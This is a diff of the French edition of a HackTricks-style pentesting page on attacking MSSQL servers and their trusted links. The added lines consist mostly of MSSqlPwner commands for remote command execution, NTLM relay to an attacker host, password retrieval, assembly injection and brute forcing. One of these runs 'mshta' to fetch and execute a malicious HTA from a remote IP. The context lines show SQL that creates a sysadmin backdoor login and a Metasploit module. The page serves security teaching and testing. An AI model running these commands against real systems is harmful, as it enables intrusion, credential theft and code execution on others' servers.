@@ -21,6 +21,72 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ## **MSSQL Enumeration / Discovery**
 
+### Python
+L'outil [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) est basé sur impacket, et permet également de s'authentifier en utilisant des tickets kerberos, et d'attaquer à travers des chaînes de liens.
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### Énumération depuis le réseau sans session de domaine
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
+
 Le module powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) est très utile dans ce cas.
 ```powershell
 Import-Module .\PowerupSQL.psd1
@@ -133,7 +199,7 @@ Vous pouvez facilement vérifier les liens de confiance en utilisant metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Remarquez que metasploit essaiera d'abuser uniquement de la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus ci-dessous.)
+Remarquez que metasploit essaiera d'abuser uniquement de la fonction `openquery()` dans MSSQL (donc, si vous ne pouvez pas exécuter de commande avec `openquery()`, vous devrez essayer la méthode `EXECUTE` **manuellement** pour exécuter des commandes, voir plus bas.)
 
 ### Manuel - Openquery()
 
@@ -182,11 +248,11 @@ Vous pouvez également abuser des liens de confiance en utilisant `EXECUTE` :
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Élévation de privilèges locale
+## Escalade de privilèges locale
 
 L'**utilisateur local MSSQL** a généralement un type de privilège spécial appelé **`SeImpersonatePrivilege`**. Cela permet au compte de "se faire passer pour un client après authentification".
 
-Une stratégie que de nombreux auteurs ont développée est de forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
+Une stratégie que de nombreux auteurs ont proposée est de forcer un service SYSTEM à s'authentifier auprès d'un service malveillant ou de type homme du milieu que l'attaquant crée. Ce service malveillant peut alors se faire passer pour le service SYSTEM pendant qu'il essaie de s'authentifier.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) a une collection de ces diverses techniques qui peuvent être exécutées via la commande `execute-assembly` de Beacon.
 
@@ -204,7 +270,7 @@ Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt=
 
 * Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
+* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
 </details>
 {% endhint %}
